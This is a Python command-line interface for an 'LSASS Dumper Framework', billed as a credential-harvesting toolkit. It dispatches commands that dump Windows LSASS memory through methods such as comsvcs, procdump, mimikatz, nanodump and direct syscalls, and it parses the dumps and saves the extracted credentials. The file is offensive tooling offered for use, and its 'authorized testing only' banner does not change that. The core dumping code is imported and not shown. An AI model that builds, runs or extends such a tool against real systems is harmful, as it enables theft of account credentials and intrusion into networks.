#!/usr/bin/env python3
"""
Command-line interface for LSASS Dumper Framework
"""

import argparse
import sys
from pathlib import Path

from .core import LsassDumper
from .utils import print_privilege_status


def print_banner():
    """Print framework banner"""
    banner = """
╔═══════════════════════════════════════════════════════════════════╗
║                  LSASS DUMPER FRAMEWORK v1.0                      ║
║          Multi-Method Credential Harvesting Toolkit               ║
║                                                                   ║
║  WARNING: For authorized security testing only                   ║
║  Unauthorized access to computer systems is illegal              ║
╚═══════════════════════════════════════════════════════════════════╝
"""
    print(banner)


def cmd_dump(args):
    """Execute dump command"""
    dumper = LsassDumper(output_dir=args.output)
    
    if args.method == 'auto':
        result = dumper.auto_dump(preferred_method=args.prefer)
    else:
        result = dumper.dump(args.method)
    
    if result:
        if args.parse:
            print(f"\n[*] Parsing dump file...")
            dumper.parse_dump(result['file'], save_creds=True)
        
        return 0
    else:
        return 1


def cmd_parse(args):
    """Execute parse command"""
    dumper = LsassDumper(output_dir=args.output)
    
    credentials = dumper.parse_dump(args.file, save_creds=not args.no_save)
    
    return 0 if credentials else 1


def cmd_list(args):
    """List available methods"""
    dumper = LsassDumper()
    
    if args.available:
        available = dumper.list_available_methods()
        print(f"\n[*] {len(available)} methods ready to use")
    else:
        dumper.show_all_methods()
    
    return 0


def cmd_info(args):
    """Show method information"""
    dumper = LsassDumper()
    dumper.show_method_info(args.method)
    return 0


def cmd_check(args):
    """Check privileges and environment"""
    print_banner()
    
    print(f"\n[*] Environment Check")
    print(f"="*70)
    
    # Check privileges
    print_privilege_status()
    
    # Check available methods
    print(f"\n[*] Method Availability:")
    dumper = LsassDumper()
    available = dumper.list_available_methods()
    
    print(f"\n[+] {len(available)}/{len(dumper.dumpers)} methods available")
    
    return 0


def main():
    """Main CLI entry point"""
    parser = argparse.ArgumentParser(
        description='Multi-Method LSASS Dumper Framework',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Auto dump with default method
  lsass_dump.py dump --auto
  
  # Dump with specific method
  lsass_dump.py dump --method comsvcs
  
  # Dump and parse
  lsass_dump.py dump --auto --parse
  
  # Parse existing dump
  lsass_dump.py parse --file lsass_dumps/lsass_comsvcs_20240115_120000.dmp
  
  # List available methods
  lsass_dump.py list
  
  # Show method details
  lsass_dump.py info --method comsvcs
  
  # Check privileges and availability
  lsass_dump.py check
"""
    )
    
    parser.add_argument('--version', action='version', version='LSASS Dumper v1.0')
    parser.add_argument('--output', '-o', default='lsass_dumps',
                       help='Output directory (default: lsass_dumps)')
    
    subparsers = parser.add_subparsers(dest='command', help='Commands')
    
    # Dump command
    dump_parser = subparsers.add_parser('dump', help='Dump LSASS memory')
    dump_parser.add_argument('--method', '-m',
                            choices=['auto', 'comsvcs', 'procdump', 'powershell',
                                   'mimikatz', 'nanodump', 'direct_syscalls'],
                            default='auto',
                            help='Dump method (default: auto)')
    dump_parser.add_argument('--prefer', '-p', default='comsvcs',
                            help='Preferred method for auto mode (default: comsvcs)')
    dump_parser.add_argument('--parse', action='store_true',
                            help='Automatically parse dump after creation')
    dump_parser.set_defaults(func=cmd_dump)
    
    # Parse command
    parse_parser = subparsers.add_parser('parse', help='Parse existing dump file')
    parse_parser.add_argument('--file', '-f', required=True,
                             help='Dump file to parse')
    parse_parser.add_argument('--no-save', action='store_true',
                             help='Do not save credentials to files')
    parse_parser.set_defaults(func=cmd_parse)
    
    # List command
    list_parser = subparsers.add_parser('list', help='List dump methods')
    list_parser.add_argument('--available', '-a', action='store_true',
                            help='Only show currently available methods')
    list_parser.set_defaults(func=cmd_list)
    
    # Info command
    info_parser = subparsers.add_parser('info', help='Show method information')
    info_parser.add_argument('--method', '-m', required=True,
                            help='Method name')
    info_parser.set_defaults(func=cmd_info)
    
    # Check command
    check_parser = subparsers.add_parser('check', help='Check privileges and environment')
    check_parser.set_defaults(func=cmd_check)
    
    # Parse arguments
    args = parser.parse_args()
    
    # Show banner
    print_banner()
    
    # Execute command
    if hasattr(args, 'func'):
        return args.func(args)
    else:
        parser.print_help()
        return 1


if __name__ == '__main__':
    sys.exit(main())
